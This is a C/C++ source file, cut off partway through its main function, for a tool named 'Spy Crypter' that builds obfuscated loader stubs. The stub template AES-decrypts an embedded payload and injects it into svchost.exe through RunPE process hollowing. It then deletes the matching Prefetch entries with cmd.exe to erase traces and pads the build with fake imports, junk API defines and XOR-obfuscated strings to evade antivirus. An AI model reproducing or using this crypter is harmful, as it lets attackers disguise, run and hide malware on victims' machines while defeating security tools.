#define _CRT_SECURE_NO_WARNINGS

#include "tools/timestamps.h"

#include <windows.h>
#include <tchar.h>
#include <intrin.h>
#include <Strsafe.h> 

#include "tools/funcgen/globals.h"
#include "tools/funcgen/mConfigLoader.h" 
#include "tools/funcgen/mImport.h"
#include "tools/funcgen/mCodeLines.h"
#include "tools/funcgen/mPayloadChunks.h"


#include "tools/aes/aes.h"
#include "tools/aes/aes.c" 

#pragma warning(disable:C4200) 

#define CRYPTER_BLOCK_LENGTH         256
#define CRYPTER_BLOCK_LENGTH_BYTES   CRYPTER_BLOCK_LENGTH/8

//TYPES: 0 - EXE-EXE; 1 - DLL-EXE; 2 - DLL-DLL; 3 - EXE-DLL
int type = 0;
 
const char* CRYPTER_BASE_SOURCE =
"%s\n" //fake imports
"#pragma warning( disable : 4700 )\n"
"#pragma warning( disable : 4703 )\n"
"#include <stdio.h>\n"
"#include <stdlib.h>\n"
"#include <string.h>\n"
"#include <windows.h>\n"
"#include <fstream>\n"
//"#include <algorithm>\n"
//"#include <cctype>\n"
//"#include <tchar.h>\n"
"using namespace std;\n"
"using std::stringstream;\n"
"#include \"%s/%s\"\n"
"#include \"%s/tools/aes/aes.h\"\n"
"#include \"%s/tools/aes/aes.c\"\n"
//"#include \"%s/tools/DataObfuscator.h\"\n"
"#include \"%s/tools/main.h\"\n"
"unsigned char p[] = {%s};\n"
"auto k = MP_OB(\"%s\");\n"
"auto i = MP_OB(\"%s\");\n"
"void hex2bin(char*h,unsigned char*o,size_t len){"
"char t[3];int i;for(i=0;i<len/2;++i){memset(t,(char)0x00,3);memcpy(t,h,2);o[i]=(char)strtoul(t,NULL,16);h=h+2;}"
"}\n"
"%s"

"\n#ifdef DEBUG\n"
"AllocConsole();\n"
"freopen(\"conin$\", \"r\", stdin);\n"
"freopen(\"conout$\", \"w\", stdout);\n"
"freopen(\"conout$\", \"w\", stderr);\n"
"#else\n"
"FreeConsole();\n" 
"#endif\n"

"int kl = 64, il = 64;\n"
"struct AES_ctx ctx;\n"
"unsigned char dk[65],di[65];\n"
"hex2bin((char*)k.c_str(),dk,kl);\n"
"hex2bin((char*)i.c_str(),di,il);\n"
"AES_init_ctx_iv(&ctx,dk,di);\n"
"AES_CBC_decrypt_buffer(&ctx,p,sizeof(p));\n"
"#ifdef _WIN64\n"
"auto path = MP_OB(L\"%%WINDIR%%\\\\System32\\\\svchost.exe\");\n"
"#else\n"
"auto path = MP_OB(L\"%%WINDIR%%\\\\SysWOW64\\\\svchost.exe\");\n"
"#endif\n"
"wchar_t upath[MAX_PATH];\n"
"ExpandEnvironmentStringsW(path.c_str(), upath, ExpandEnvironmentStringsW(path.c_str(), NULL, NULL));\n"
"RunPE(p, upath, sizeof(p), (LPWSTR)L\"\");\n"
"TCHAR szExeFileName[MAX_PATH];\n"
"GetModuleFileName(NULL, szExeFileName, MAX_PATH);\n"
"string filepath = string(szExeFileName);\n"
"string exe = filepath.substr(filepath.find_last_of(XorStr(\"\\\\\")) + 1, filepath.size());\n" 
"CHAR cat[MAX_PATH] = \"\"; strcat(cat, XorStr(\"cmd.exe /c timeout 3 & del \\\"C:\\\\Windows\\\\Prefetch\\\\ \")); \n"
"STARTUPINFOA startInf;\n"
"memset(&startInf, 0, sizeof startInf);\n"
"startInf.cb = sizeof(startInf);\n"
"PROCESS_INFORMATION procInf;\n"
"memset(&procInf, 0, sizeof procInf);\n"
"BOOL b = CreateProcessA(NULL, strcat(strcat(cat, exe.c_str()), XorStr(\"*\\\" & del \\\"C:\\\\Windows\\\\Prefetch\\\\cmd.exe*\\\" & del \\\"C:\\\\Windows\\\\Prefetch\\\\timeout.exe*\\\" \")), NULL, NULL, FALSE,\n"
"	NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &startInf, &procInf); \n"
"%s\n" //function_trash_0();
"#ifdef DEBUG\n"
"system(\"pause\");\n"
"#endif\n"
"return 0;\n"
"}}\n"
"%s\n"; //trash functions 

char* stub_ = "\r\n"
		"//=============================================================\r\n"
		"//= Includes Part\r\n"
		"//=============================================================\r\n"
		"#include <intrin.h>\r\n"
		"#include <Objbase.h>\r\n"
		"#include <Callobj.h>\r\n"
		"#include <Shellapi.h>\r\n"
		"#include <Urlmon.h>\r\n"
		"#include <Prsht.h>\r\n"
		"#include <Userenv.h>\r\n"
		"#include <Commctrl.h>\r\n"
		"#include <Shlwapi.h>\r\n"
		"#include <Shlobj.h>\r\n"
		"#include <Intshcut.h>\r\n"
		"#include <Ole2.h>\r\n"
		"#include <GuidDef.h>\r\n"
		"#include <Olectl.h>\r\n"
		//"#include <Sisbkup.h>\r\n"
		"#include <ctype.h>\r\n"
		"#include <cstring>\r\n"
		"#include <windows.h>\r\n"
		"#include <tchar.h>\r\n"
		"#include \"shlwapi.h\"\r\n"
		"#include \"ShlObj.h\"\r\n"
		"#include \"WinUser.h\"\r\n"
		"#include <intsafe.h>\r\n"
		"#include <locale.h>\r\n"
		"#include <setjmp.h>\r\n"
		"#include <time.h> \r\n"
		"#include <locale.h>\r\n"
		"#include <assert.h>\r\n"
		"#include <windows.h>\r\n"
		"#include <stdio.h>\r\n"
		"#include <math.h>\r\n"
		"#include <Wininet.h>\r\n"
		"#include <Dbghelp.h>\r\n"
		"#include <Wincrypt.h>\r\n"
		"#include <Commctrl.h>\r\n"
		"#include <ClusApi.h>\r\n"
		"#include <Winver.h>\r\n"
		"#include <Psapi.h>\r\n"
		"#include <Winnetwk.h>\r\n"
		"#include <process.h>\r\n"
		"#include <conio.h> \r\n"
		"#include <shlwapi.h>\r\n"
		"#include <stdlib.h>\r\n"
		"#include <malloc.h>\r\n"
		"#include <time.h>\r\n"
		"#include <gl/gl.h>\r\n"
		"#include <signal.h>\r\n"
		"#include <Tlhelp32.h>\r\n"
		"#include <oledlg.h>\r\n"
		"#include <commctrl.h>\r\n"
		"#include <wchar.h>\r\n"
		"#include <locale.h>\r\n"
		"#include <ctype.h>\r\n"
		"#include <stdarg.h>\r\n"
		"#include <gdiplus.h>\r\n"
		"#include <Uxtheme.h>\r\n"
		"\r\n"
		"//=============================================================\r\n"
		"//= Libs includes Part\r\n"
		"//=============================================================\r\n"
		"#pragma comment(lib,\"user32.lib\")\r\n"
		"#pragma comment(lib,\"Comdlg32.lib\")\r\n"
		"#pragma comment(lib,\"UrlMon.lib\")\r\n"
		"#pragma comment(lib,\"Shell32.lib\")\r\n"
		"#pragma comment(lib,\"oledlg.lib\")\r\n"
		"#pragma comment(lib,\"Ole32.lib\")\r\n"
		"#pragma comment(lib,\"AdvApi32.lib\")\r\n"
		"#pragma comment(lib,\"WinInet.lib\")\r\n"
		"#pragma comment(lib,\"Gdi32.lib\")\r\n"
		"#pragma comment(lib,\"WS2_32.lib\")\r\n"
		"#pragma comment(lib,\"opengl32.lib\")\r\n"
		"#pragma comment(lib,\"Dbghelp.lib\")\r\n"
		"#pragma comment(lib,\"Crypt32.lib\")\r\n"
		"#pragma comment(lib,\"Comctl32.lib\")\r\n"
		"#pragma comment(lib,\"ClusApi.lib\")\r\n"
		"#pragma comment(lib,\"Version.lib\")\r\n"
		"#pragma comment(lib,\"Psapi.lib\")\r\n"
		"#pragma comment(lib,\"Mpr.lib\")\r\n"
		"#pragma comment(lib,\"credui.lib\")\r\n"
		"#pragma comment(lib,\"cryptui.lib\")\r\n"
		"#pragma comment(lib,\"msacm32.lib\")\r\n"
		"#pragma comment(lib,\"oleacc.lib\")\r\n"
		"#pragma comment(lib,\"secur32.lib\")\r\n"
		"#pragma comment(lib,\"shdocvw.lib\")\r\n"
		"#pragma comment(lib,\"snmpapi.lib\")\r\n"
		"#pragma comment(lib,\"traffic.lib\")\r\n"
		"#pragma comment(lib,\"winhttp.lib\")\r\n"
		"#pragma comment(lib,\"advpack.lib\")\r\n"
		"#pragma comment(lib,\"avifil32.lib\")\r\n"
		"#pragma comment(lib,\"bcrypt.lib\")\r\n"
		"#pragma comment(lib,\"bthprops.lib\")\r\n"
		"#pragma comment(lib,\"clfsw32.lib\")\r\n"
		"#pragma comment(lib,\"ComCtl32.lib\")\r\n"
		"#pragma comment(lib,\"DhcpCSvc.lib\")\r\n"
		"#pragma comment(lib,\"dhcpsapi.lib\")\r\n"
		"#pragma comment(lib,\"DnsAPI.lib\")\r\n"
		"#pragma comment(lib,\"dwmapi.lib\")\r\n"
		"#pragma comment(lib,\"esent.lib\")\r\n"
		"#pragma comment(lib,\"GdiPlus.lib\")\r\n"
		"#pragma comment(lib,\"HLink.lib\")\r\n"
		"#pragma comment(lib,\"httpapi.lib\")\r\n"
		"#pragma comment(lib,\"ImageHlp.lib\")\r\n"
		"#pragma comment(lib,\"Imm32.lib\")\r\n"
		"#pragma comment(lib,\"IPHlpApi.lib\")\r\n"
		//"#pragma comment(lib,\"irprops.lib\")\r\n"
		"#pragma comment(lib,\"MAPI32.lib\")\r\n"
		//"#pragma comment(lib,\"Mf_vista.lib\")\r\n"
		"#pragma comment(lib,\"Mfplat.lib\")\r\n"
		"#pragma comment(lib,\"Mprapi.lib\")\r\n"
		"#pragma comment(lib,\"Mscms.lib\")\r\n"
		"#pragma comment(lib,\"mscoree.lib\")\r\n"
		"#pragma comment(lib,\"mscorsn.lib\")\r\n"
		"#pragma comment(lib,\"msdrm.lib\")\r\n"
		"#pragma comment(lib,\"Msi.lib\")\r\n"
		"#pragma comment(lib,\"msvfw32.lib\")\r\n"
		"#pragma comment(lib,\"ncrypt.lib\")\r\n"
		"#pragma comment(lib,\"NetAPI32.lib\")\r\n"
		//"#pragma comment(lib,\"nmapi.lib\")\r\n"
		"#pragma comment(lib,\"NtDsAPI.lib\")\r\n"
		//"#pragma comment(lib,\"NTMSAPI.lib\")\r\n"
		"#pragma comment(lib,\"NtQuery.lib\")\r\n"
		"#pragma comment(lib,\"OleAut32.lib\")\r\n"
		"#pragma comment(lib,\"p2p.lib\")\r\n"
		"#pragma comment(lib,\"p2pgraph.lib\")\r\n"
		"#pragma comment(lib,\"Pdh.lib\")\r\n"
		"#pragma comment(lib,\"powrprof.lib\")\r\n"
		"#pragma comment(lib,\"propsys.lib\")\r\n"
		"#pragma comment(lib,\"RASAPI32.lib\")\r\n"
		"#pragma comment(lib,\"RASDlg.lib\")\r\n"
		"#pragma comment(lib,\"ResUtils.lib\")\r\n"
		"#pragma comment(lib,\"Rpcns4.lib\")\r\n"
		"#pragma comment(lib,\"Rtm.lib\")\r\n"
		"#pragma comment(lib,\"Rtutils.lib\")\r\n"
		"#pragma comment(lib,\"SetupAPI.lib\")\r\n"
		"#pragma comment(lib,\"ShLwApi.lib\")\r\n"
		"#pragma comment(lib,\"slc.lib\")\r\n"
		"#pragma comment(lib,\"SnmpAPI.lib\")\r\n"
		"#pragma comment(lib,\"Tapi32.lib\")\r\n"
		"#pragma comment(lib,\"UserEnv.lib\")\r\n"
		"#pragma comment(lib,\"Uxtheme.lib\")\r\n"
		"#pragma comment(lib,\"Vfw32.lib\")\r\n"
		"#pragma comment(lib,\"WdsClientApi.lib\")\r\n"
		"#pragma comment(lib,\"WebServices.lib\")\r\n"
		"#pragma comment(lib,\"wevtapi.lib\")\r\n"
		"#pragma comment(lib,\"WinBio.lib\")\r\n"
		"#pragma comment(lib,\"WinFax.lib\")\r\n"
		"#pragma comment(lib,\"winhttp.lib\")\r\n"
		"#pragma comment(lib,\"WinInet.lib\")\r\n"
		"#pragma comment(lib,\"WinMM.lib\")\r\n"
		"#pragma comment(lib,\"WinSCard.lib\")\r\n"
		"#pragma comment(lib,\"WinSpool.lib\")\r\n"
		"#pragma comment(lib,\"WinTrust.lib\")\r\n"
		"#pragma comment(lib,\"wlanapi.lib\")\r\n"
		"#pragma comment(lib,\"wscapi.lib\")\r\n"
		"#pragma comment(lib,\"wsdapi.lib\")\r\n"
		"#pragma comment(lib,\"wsmsvc.lib\")\r\n"
		"#pragma comment(lib,\"WSnmp32.lib\")\r\n"
		"#pragma comment(lib,\"WSock32.lib\")\r\n"
		"#pragma comment(lib,\"WtsApi32.lib\")\r\n"
		"\r\n"
		"//=============================================================\r\n"
		"//= Static Import Part\r\n"
		"//=============================================================\r\n"
		"DWORD COMCTL3295_Array[] = { (DWORD)CreateToolbarEx, (DWORD)ImageList_Remove, (DWORD)ImageList_ReplaceIcon,\r\n"
		"(DWORD)InitCommonControlsEx, (DWORD)ImageList_Destroy, (DWORD)ImageList_Create, (DWORD)ImageList_SetBkColor};\r\n"
		"\r\n"
		"DWORD USER3221_Array[] = { (DWORD)GetWindowLongA, (DWORD)wvsprintfA, (DWORD)SetWindowPos, (DWORD)FindWindowA,\r\n"
		"(DWORD)RedrawWindow, (DWORD)GetWindowTextA, (DWORD)EnableWindow, (DWORD)GetSystemMetrics,\r\n"
		"(DWORD)IsWindow, (DWORD)CheckRadioButton, (DWORD)UnregisterClassA, (DWORD)SetCursor,\r\n"
		"(DWORD)GetSysColorBrush, (DWORD)DialogBoxParamA, (DWORD)DestroyAcceleratorTable, (DWORD)DispatchMessageA,\r\n"
		"(DWORD)TranslateMessage, (DWORD)LoadIconA, (DWORD)EmptyClipboard, (DWORD)SetClipboardData, (DWORD)SetFocus,\r\n"
		"(DWORD)CharUpperA, (DWORD)OpenClipboard, (DWORD)IsDialogMessageA, (DWORD)TranslateAcceleratorA, (DWORD)GetMessageA,\r\n"
		"(DWORD)LoadAcceleratorsA, (DWORD)RemoveMenu, (DWORD)InvalidateRect, (DWORD)ChildWindowFromPoint, (DWORD)PostMessageA,\r\n"
		"(DWORD)DestroyCursor, (DWORD)CreateDialogParamA, (DWORD)GetWindowRect, (DWORD)IsMenu, (DWORD)GetSubMenu, (DWORD)SetDlgItemInt,\r\n"
		"(DWORD)GetWindowPlacement, (DWORD)CharLowerBuffA, (DWORD)EnableMenuItem, (DWORD)CheckMenuRadioItem, (DWORD)GetSysColor,\r\n"
		"(DWORD)KillTimer, (DWORD)DestroyIcon, (DWORD)DestroyWindow, (DWORD)PostQuitMessage, (DWORD)GetClientRect, (DWORD)MoveWindow,\r\n"
		"(DWORD)GetSystemMenu, (DWORD)SetTimer, (DWORD)SetWindowPlacement, (DWORD)InsertMenuItemA, (DWORD)GetMenu, (DWORD)CheckMenuItem,\r\n"
		"(DWORD)SetMenuItemInfoA, (DWORD)SetActiveWindow, (DWORD)DefDlgProcA, (DWORD)RegisterClassA, (DWORD)EndDialog, (DWORD)SetDlgItemTextA,\r\n"
		"(DWORD)EnumClipboardFormats, (DWORD)GetClipboardData, (DWORD)CloseClipboard, (DWORD)GetClassInfoA, (DWORD)CallWindowProcA,\r\n"
		"(DWORD)SetWindowLongA, (DWORD)IsDlgButtonChecked, (DWORD)SetWindowTextA, (DWORD)CheckDlgButton, (DWORD)GetActiveWindow, (DWORD)LoadCursorA,\r\n"
		"(DWORD)MessageBoxA, (DWORD)wsprintfA, (DWORD)GetDlgItemTextA, (DWORD)SendMessageA, (DWORD)GetCursorPos, (DWORD)TrackPopupMenu,\r\n"
		"(DWORD)ClientToScreen, (DWORD)DestroyMenu, (DWORD)CreatePopupMenu, (DWORD)AppendMenuA, (DWORD)SendDlgItemMessageA, (DWORD)GetDlgItem };\r\n"
		"\r\n"
		"DWORD GDI32121_Array[] = { (DWORD)GetObjectA, (DWORD)GetStockObject, (DWORD)DeleteObject, (DWORD)SetBkMode, (DWORD)SetTextColor, (DWORD)CreateFontIndirectA, (DWORD)SelectObject };\r\n"
		"\r\n"
		"DWORD comdlg3218_Array[] = { (DWORD)GetOpenFileNameA, (DWORD)GetSaveFileNameA };\r\n"
		"\r\n"
		"DWORD ADVAPI32214_Array[] = { (DWORD)RegCreateKeyA, (DWORD)RegSetValueA, (DWORD)GetUserNameA, (DWORD)RegCloseKey,\r\n"
		"(DWORD)RegOpenKeyExA, (DWORD)AdjustTokenPrivileges, (DWORD)LookupPrivilegeValueA, (DWORD)OpenProcessToken, (DWORD)RegQueryValueExA, (DWORD)RegDeleteKeyA };\r\n"
		"\r\n"
		"//=============================================================\r\n"
		"//= Fake API Defines for future calls them without transformation\r\n"
		"//=============================================================\r\n"
		"#define k_AreFileApisANSI (*(DWORD(WINAPI *)(VOID)) AreFileApisANSI)\r\n"
		"#define k_AssignProcessToJobObject (*(DWORD(WINAPI *)(DWORD,DWORD)) AssignProcessToJobObject)\r\n"
		"#define k_CancelWaitableTimer (*(DWORD(WINAPI *)(DWORD)) CancelWaitableTimer)\r\n"
		"#define k_ClearCommBreak (*(DWORD(WINAPI *)(DWORD)) ClearCommBreak)\r\n"
		"#define k_ClearCommError (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) ClearCommError)\r\n"
		"#define k_ConvertFiberToThread (*(DWORD(WINAPI *)(VOID)) ConvertFiberToThread)\r\n"
		"#define k_ConvertThreadToFiber (*(DWORD(WINAPI *)(DWORD)) ConvertThreadToFiber)\r\n"
		"#define k_CreateFiber (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) CreateFiber)\r\n"
		"#define k_CreateFiberEx (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD,DWORD)) CreateFiberEx)\r\n"
		"#define k_CreateFileMappingW (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD,DWORD,DWORD)) CreateFileMappingW)\r\n"
		"#define k_CreateIoCompletionPort (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD)) CreateIoCompletionPort)\r\n"
		"#define k_CreateMemoryResourceNotification (*(DWORD(WINAPI *)(DWORD)) CreateMemoryResourceNotification)\r\n"
		"#define k_CreateTapePartition (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD)) CreateTapePartition)\r\n"
		"#define k_CreateTimerQueue (*(DWORD(WINAPI *)(VOID)) CreateTimerQueue)\r\n"
		"#define k_DecodePointer (*(DWORD(WINAPI *)(DWORD)) DecodePointer)\r\n"
		"#define k_DecodeSystemPointer (*(DWORD(WINAPI *)(DWORD)) DecodeSystemPointer)\r\n"
		"#define k_DisableThreadLibraryCalls (*(DWORD(WINAPI *)(DWORD)) DisableThreadLibraryCalls)\r\n"
		"#define k_DisconnectNamedPipe (*(DWORD(WINAPI *)(DWORD)) DisconnectNamedPipe)\r\n"
		"#define k_EncodePointer (*(DWORD(WINAPI *)(DWORD)) EncodePointer)\r\n"
		"#define k_EncodeSystemPointer (*(DWORD(WINAPI *)(DWORD)) EncodeSystemPointer)\r\n"
		"#define k_EraseTape (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) EraseTape)\r\n"
		"#define k_EscapeCommFunction (*(DWORD(WINAPI *)(DWORD,DWORD)) EscapeCommFunction)\r\n"
		"#define k_FindFirstFileExW (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD,DWORD,DWORD)) FindFirstFileExW)\r\n"
		"#define k_FindNextChangeNotification (*(DWORD(WINAPI *)(DWORD)) FindNextChangeNotification)\r\n"
		"#define k_FlushFileBuffers (*(DWORD(WINAPI *)(DWORD)) FlushFileBuffers)\r\n"
		"#define k_FlushInstructionCache (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) FlushInstructionCache)\r\n"
		"#define k_FlushViewOfFile (*(DWORD(WINAPI *)(DWORD,DWORD)) FlushViewOfFile)\r\n"
		"#define k_FreeResource (*(DWORD(WINAPI *)(DWORD)) FreeResource)\r\n"
		"#define k_GetCommMask (*(DWORD(WINAPI *)(DWORD,DWORD)) GetCommMask)\r\n"
		"#define k_GetCommModemStatus (*(DWORD(WINAPI *)(DWORD,DWORD)) GetCommModemStatus)\r\n"
		"#define k_GetCommTimeouts (*(DWORD(WINAPI *)(DWORD,DWORD)) GetCommTimeouts)\r\n"
		"#define k_GetCommandLineA (*(DWORD(WINAPI *)(VOID)) GetCommandLineA)\r\n"
		"#define k_GetCommandLineW (*(DWORD(WINAPI *)(VOID)) GetCommandLineW)\r\n"
		"#define k_GetCurrentProcess (*(DWORD(WINAPI *)(VOID)) GetCurrentProcess)\r\n"
		"#define k_GetCurrentProcessId (*(DWORD(WINAPI *)(VOID)) GetCurrentProcessId)\r\n"
		"#define k_GetCurrentThread (*(DWORD(WINAPI *)(VOID)) GetCurrentThread)\r\n"
		"#define k_GetCurrentThreadId (*(DWORD(WINAPI *)(VOID)) GetCurrentThreadId)\r\n"
		"#define k_GetFileAttributesExW (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) GetFileAttributesExW)\r\n"
		"#define k_GetFileInformationByHandle (*(DWORD(WINAPI *)(DWORD,DWORD)) GetFileInformationByHandle)\r\n"
		"#define k_GetFileTime (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD)) GetFileTime)\r\n"
		"#define k_GetFileType (*(DWORD(WINAPI *)(DWORD)) GetFileType)\r\n"
		"#define k_GetLastError (*(DWORD(WINAPI *)(VOID)) GetLastError)\r\n"
		"#define k_GetLogicalDrives (*(DWORD(WINAPI *)(VOID)) GetLogicalDrives)\r\n"
		"#define k_GetMailslotInfo (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD,DWORD)) GetMailslotInfo)\r\n"
		"#define k_GetModuleFileNameA (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) GetModuleFileNameA)\r\n"
		"#define k_GetModuleFileNameW (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) GetModuleFileNameW)\r\n"
		"#define k_GetNamedPipeHandleStateA (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD,DWORD,DWORD,DWORD)) GetNamedPipeHandleStateA)\r\n"
		"#define k_GetNamedPipeHandleStateW (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD,DWORD,DWORD,DWORD)) GetNamedPipeHandleStateW)\r\n"
		"#define k_GetNamedPipeInfo (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD,DWORD)) GetNamedPipeInfo)\r\n"
		"#define k_GetPriorityClass (*(DWORD(WINAPI *)(DWORD)) GetPriorityClass)\r\n"
		"#define k_GetProcessAffinityMask (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) GetProcessAffinityMask)\r\n"
		"#define k_GetProcessHandleCount (*(DWORD(WINAPI *)(DWORD,DWORD)) GetProcessHandleCount)\r\n"
		"#define k_GetProcessHeap (*(DWORD(WINAPI *)(VOID)) GetProcessHeap)\r\n"
		"#define k_GetProcessId (*(DWORD(WINAPI *)(DWORD)) GetProcessId)\r\n"
		"#define k_GetProcessIoCounters (*(DWORD(WINAPI *)(DWORD,DWORD)) GetProcessIoCounters)\r\n"
		"#define k_GetProcessPriorityBoost (*(DWORD(WINAPI *)(DWORD,DWORD)) GetProcessPriorityBoost)\r\n"
		"#define k_GetProcessTimes (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD,DWORD)) GetProcessTimes)\r\n"
		"#define k_GetProcessVersion (*(DWORD(WINAPI *)(DWORD)) GetProcessVersion)\r\n"
		"#define k_GetStdHandle (*(DWORD(WINAPI *)(DWORD)) GetStdHandle)\r\n"
		"#define k_GetTapeParameters (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD)) GetTapeParameters)\r\n"
		"#define k_GetTapeStatus (*(DWORD(WINAPI *)(DWORD)) GetTapeStatus)\r\n"
		"#define k_GetThreadContext (*(DWORD(WINAPI *)(DWORD,DWORD)) GetThreadContext)\r\n"
		"#define k_GetThreadIOPendingFlag (*(DWORD(WINAPI *)(DWORD,DWORD)) GetThreadIOPendingFlag)\r\n"
		"#define k_GetThreadPriority (*(DWORD(WINAPI *)(DWORD)) GetThreadPriority)\r\n"
		"#define k_GetThreadPriorityBoost (*(DWORD(WINAPI *)(DWORD,DWORD)) GetThreadPriorityBoost)\r\n"
		"#define k_GetThreadTimes (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD,DWORD)) GetThreadTimes)\r\n"
		"#define k_GetVersion (*(DWORD(WINAPI *)(VOID)) GetVersion)\r\n"
		"#define k_GetWriteWatch (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD,DWORD,DWORD)) GetWriteWatch)\r\n"
		"#define k_GlobalCompact (*(DWORD(WINAPI *)(DWORD)) GlobalCompact)\r\n"
		"#define k_GlobalDeleteAtom (*(DWORD(WINAPI *)(DWORD)) GlobalDeleteAtom)\r\n"
		"#define k_GlobalUnWire (*(DWORD(WINAPI *)(DWORD)) GlobalUnWire)\r\n"
		"#define k_GlobalUnfix (*(DWORD(WINAPI *)(DWORD)) GlobalUnfix)\r\n"
		"#define k_GlobalUnlock (*(DWORD(WINAPI *)(DWORD)) GlobalUnlock)\r\n"
		"#define k_InitAtomTable (*(DWORD(WINAPI *)(DWORD)) InitAtomTable)\r\n"
		"#define k_IsProcessInJob (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) IsProcessInJob)\r\n"
		"#define k_IsWow64Process (*(DWORD(WINAPI *)(DWORD,DWORD)) IsWow64Process)\r\n"
		"#define k_LocalCompact (*(DWORD(WINAPI *)(DWORD)) LocalCompact)\r\n"
		"#define k_LocalShrink (*(DWORD(WINAPI *)(DWORD,DWORD)) LocalShrink)\r\n"
		"#define k_LocalUnlock (*(DWORD(WINAPI *)(DWORD)) LocalUnlock)\r\n"
		"#define k_LockResource (*(DWORD(WINAPI *)(DWORD)) LockResource)\r\n"
		"#define k_MapUserPhysicalPagesScatter (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) MapUserPhysicalPagesScatter)\r\n"
		"#define k_MulDiv (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) MulDiv)\r\n"
		"#define k_OpenProcess (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) OpenProcess)\r\n"
		"#define k_PeekNamedPipe (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD,DWORD,DWORD)) PeekNamedPipe)\r\n"
		"#define k_PostQueuedCompletionStatus (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD)) PostQueuedCompletionStatus)\r\n"
		"#define k_PrepareTape (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) PrepareTape)\r\n"
		"#define k_PulseEvent (*(DWORD(WINAPI *)(DWORD)) PulseEvent)\r\n"
		"#define k_ReleaseMutex (*(DWORD(WINAPI *)(DWORD)) ReleaseMutex)\r\n"
		"#define k_ReleaseSemaphore (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) ReleaseSemaphore)\r\n"
		"#define k_ResetEvent (*(DWORD(WINAPI *)(DWORD)) ResetEvent)\r\n"
		"#define k_ResetWriteWatch (*(DWORD(WINAPI *)(DWORD,DWORD)) ResetWriteWatch)\r\n"
		"#define k_SetHandleCount (*(DWORD(WINAPI *)(DWORD)) SetHandleCount)\r\n"
		"#define k_SetHandleInformation (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) SetHandleInformation)\r\n"
		"#define k_SetInformationJobObject (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD)) SetInformationJobObject)\r\n"
		"#define k_SetLastError (*(DWORD(WINAPI *)(DWORD)) SetLastError)\r\n"
		"#define k_SetMailslotInfo (*(DWORD(WINAPI *)(DWORD,DWORD)) SetMailslotInfo)\r\n"
		"#define k_SetMessageWaitingIndicator (*(DWORD(WINAPI *)(DWORD,DWORD)) SetMessageWaitingIndicator)\r\n"
		"#define k_SetPriorityClass (*(DWORD(WINAPI *)(DWORD,DWORD)) SetPriorityClass)\r\n"
		"#define k_SetProcessPriorityBoost (*(DWORD(WINAPI *)(DWORD,DWORD)) SetProcessPriorityBoost)\r\n"
		"#define k_SetProcessWorkingSetSize (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) SetProcessWorkingSetSize)\r\n"
		"#define k_SetStdHandle (*(DWORD(WINAPI *)(DWORD,DWORD)) SetStdHandle)\r\n"
		"#define k_SetSystemTimeAdjustment (*(DWORD(WINAPI *)(DWORD,DWORD)) SetSystemTimeAdjustment)\r\n"
		"#define k_TransmitCommChar (*(DWORD(WINAPI *)(DWORD,DWORD)) TransmitCommChar)\r\n"
		"\r\n";


#include <random>
#include <string>
using namespace std;

bool RAND_bytes(unsigned char* key, size_t length)
{
	for (int i = 0; i < length; i++) {
		random_device rd;
		mt19937 mt(rd());
		uniform_int_distribution<int> dist(0, 255);
		key[i] = dist(mt);
	}
	return 0;
}

string Exec(char* cmd)
{
	char buffer[128];
	FILE* pipe = _popen(cmd, "r");
	if (!pipe) printf("popen failed!\n");
	else {
		while (fgets(buffer, 128, pipe)) printf(buffer);
		_pclose(pipe);
	}

	return string(buffer);
}

typedef struct CrypterPackageCtx
{
	unsigned char* key;
	unsigned char* iv;
	char* infile;

	unsigned char* ciphertext;
	int ciphertext_len;

	char* outfile;
} CrypterPackageCtx;


int CrypterPackageInit(CrypterPackageCtx* ctx, const char* filepath)
{
	ctx->key = (unsigned char*)malloc(CRYPTER_BLOCK_LENGTH_BYTES + 1);
	ctx->iv = (unsigned char*)malloc(CRYPTER_BLOCK_LENGTH_BYTES + 1);
	ctx->infile = (char*)malloc(strlen(filepath) + 1);

	if (ctx->key == NULL || ctx->iv == NULL || ctx->infile == NULL)
	{
		printf("CrypterPackageInit ERROR\n");
		return -1;
	}

	memcpy(ctx->infile, filepath, strlen(filepath));
	ctx->infile[strlen(filepath)] = '\0';

	printf("CrypterPackageInit good\n");
	return 0;
}

mConfig config;
mRandom random;
mImport import;
DWORD   max_build_procs = 0;

void main(int argc, char* argv[])
{
	printf("Spy Crypter started!'\n");
	 
	char* infile_path; char* target_name;
	bool target = false, conpresent = false, trash = false, manifest = false, input = false, output = false;
	 
	for (int i = 1; i < argc; ++i) { 
		//printf("arg %d %s\n", i, argv[i]);
		if (!strcmp(argv[i], "-c") || !strcmp(argv[i], "-console"))  
			conpresent = true; 
